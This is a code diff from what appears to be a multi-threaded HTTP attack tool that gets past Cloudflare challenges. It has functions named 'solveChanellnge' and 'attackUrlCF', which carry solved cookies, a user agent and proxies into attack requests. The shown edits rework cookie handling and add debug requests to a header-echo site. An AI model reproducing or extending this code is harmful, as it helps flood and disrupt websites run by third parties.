@@ -88,7 +88,7 @@ def solveChanellnge(url):
 			# print('got cookies:')
 			print(userAgent)
 
-			return cookiesStr, userAgent, proxies
+			return cookies, userAgent, proxies
 		except Exception as err:
 			print('error in solving, trying again', err)
 
@@ -107,28 +107,16 @@ def attackUrlCF(baseUrl, threadNumber):
 			'Accept-Encoding': 'gzip, deflate, br',
 			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',	
 			'User-Agent': userAgent,
-			'Cookie': cookiesStr,
+			#'Cookie': cookiesStr,
 			'Connection': 'keep-alive',
 			'Upgrade-Insecure-Requests': '1',
 			}
 
 			# checkIp()
-			print(proxies, headers)
-			cookies = cookiesStr.split(";")
-			cj = http.cookiejar.CookieJar()
-
-			for c in cookies:
-				k,v = c.split("=")
-				cookie = http.cookiejar.Cookie(None, k, v, None, False, "", 
-												False, "", "",
-												False,False, False,False,
-												False,
-												"",
-												"",None)
-
-				cj.set_cookie(cookie)
-			print(requests.get('http://www.xhaus.com/headers', headers=headers).content)
+			print(proxies, headers, cookiesStr)
 			
+			print(requests.get('http://www.xhaus.com/headers', headers=headers, cookies=cookiesStr).content)
+			input()
 			# print(requests.get('http://myhttpheader.com/' , headers=headers, proxies=proxies).content)
 			# input()
 
